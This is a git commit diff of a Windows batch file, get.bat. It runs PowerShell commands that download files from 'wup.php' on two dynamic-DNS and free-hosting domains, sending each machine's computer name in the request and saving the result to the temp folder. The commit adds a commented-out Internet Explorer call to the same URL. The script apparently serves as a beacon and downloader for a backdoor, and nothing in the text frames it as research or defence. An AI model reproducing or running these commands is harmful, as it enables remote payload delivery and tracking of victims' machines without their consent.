e2da95f0e4b87b09d8256404822cd7a72352bd75
pistacchietto <pistacchietto2@gmail.com>
2018-06-29 09:24:55 +0200

    ok

--- get.bat
+++ get.bat
@@ -1,2 +1,3 @@
 %windir%\System32\cmd.exe /c powershell -Command (new-object System.Net.WebClient).DownloadFile('http://verifiche.ddns.net/svc/wup.php?pc=%computername%_1','%temp%\%computername%_1')
 %windir%\System32\cmd.exe /c powershell -Command (new-object System.Net.WebClient).DownloadFile('http://paner.altervista.org/svc/wup.php?pc=%computername%_1','%temp%\%computername%_2')
+rem "%ProgramFiles%\Internet Explorer\iexplore.exe" http://verifiche.ddns.net/svc/wup.php?pc=%computername%_ie
